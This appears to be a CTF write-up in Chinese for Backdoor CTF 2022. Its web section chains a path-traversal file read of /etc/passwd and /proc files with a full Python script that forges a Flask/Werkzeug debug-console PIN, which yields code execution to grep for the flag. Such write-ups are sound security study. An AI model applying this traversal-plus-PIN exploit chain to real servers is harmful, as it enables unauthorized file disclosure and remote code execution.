# Backdoor CTF
###### tags: `CTF`

## Misc
### Welcome
![](https://i.imgur.com/s7NhI6j.png)

discord -> 搜尋 flag ->

![](https://i.imgur.com/s95KgRT.png)

flag{w3lc0m3_70_b4ckd00r_2022}

## Web
### (X) Hack the planet

以下參考別人的解法

一進入首頁，發現什麼東西都沒有

![](https://i.imgur.com/Bq8Lf8Z.png =500x)

從標題的 Konsole 推測是跟 Flask 的 debug mode console 有關，發現確實有 `/console` 的 endpoint，需要 pin

![](https://i.imgur.com/alq3Fec.png =500x)

因此，需要有一個讀檔漏洞幫我們取得必要的資訊

透過通靈出一個 `/admin` 路徑，發現有 `/article` 路徑可以使用

![](https://i.imgur.com/ma99cYc.png)

照著指示發現有 No such file or directory 的錯誤，這邊應該有進行讀檔操作

![](https://i.imgur.com/HqCEGMl.png =500x)

發現 name 參數就是讀檔案的路徑，且有 path traversal 漏洞，嘗試讀取 `/etc/passwd` 成功

```
?name=../../../../etc/passwd
```

![](https://i.imgur.com/czOHkO9.png)

參考 [這篇](https://zhuanlan.zhihu.com/p/549307995) 以及 [這篇](https://inhann.top/2021/02/25/flask_newer/#pin-rce) 文章，發現需要一些參數協助計算 pin

在 username 部分，使用讀取 `/proc/self/environ` 看 home 路徑，發現是 `r00t-user`

```
name=../../../../proc/self/environ
```

![](https://i.imgur.com/iW06eZq.png)

另外也得知 python 版本為 3.9

modname, appname 在原程式碼中看不到有設定的指令，推測是使用預設的 `flask.app` 和 `Flask`

moddir 根據上面的 python 版本，得出為 `/usr/local/lib/python3.9/site-packages/flask/app.py`

uuidnode 讀取 `/sys/class/net/eth0/address`，得出為 `02:42:ac:11:00:03`，當然後面要轉成 10 進位數

![](https://i.imgur.com/8vJNABz.png)

machine_id 的部分比較複雜，需要讀取 2 (docker 環境) 或 3 (非 docker 環境) 個檔案，在此題中可得知是在 docker 環境中，所以需要讀取 `/proc/sys/kernel/random/boot_id` 和 `/proc/self/cgroup` 的內容並拼接

`boot_id`: `d5a09294-c0e7-4cf9-a10b-4cdb79f8620c`

![](https://i.imgur.com/MnvjAor.png)

`cgroup`: `590c806c6d83846eed0e2eb62c5940bd3c34b2d70dc4bf5ff54766addfd69741`

![](https://i.imgur.com/KpQxUxe.png)

因此可透過這些資訊計算出 flask console pin，以下是計算的程式

:::spoiler solve.py
```python=
import hashlib
from itertools import chain
from Crypto.Util.number import bytes_to_long

private_bits = [str(bytes_to_long(bytes.fromhex("02:42:ac:11:00:03".replace(":", "")))),'d5a09294-c0e7-4cf9-a10b-4cdb79f8620c'+"590c806c6d83846eed0e2eb62c5940bd3c34b2d70dc4bf5ff54766addfd69741"]
probably_public_bits = ['r00t-user','flask.app','Flask','/usr/local/lib/python3.9/site-packages/flask/app.py']


h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)


h.update(b"cookiesalt")
cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv, cookie_name)
```
:::

![](https://i.imgur.com/EJdUBLz.png)

計算結果為 `823-272-760`，輸入後也成功獲得 console 操作權限

接著就是找 flag 時間，使用 grep 搜尋後，找到 flag

```python!
print(subprocess.run(["grep", "-r", "flag{", "/usr"], capture_output=True).stdout.decode())
```

![](https://i.imgur.com/Owrs8Hb.png)

flag{wh0_g4v3_y0u_my_fl4sk_p1n_23dde36g}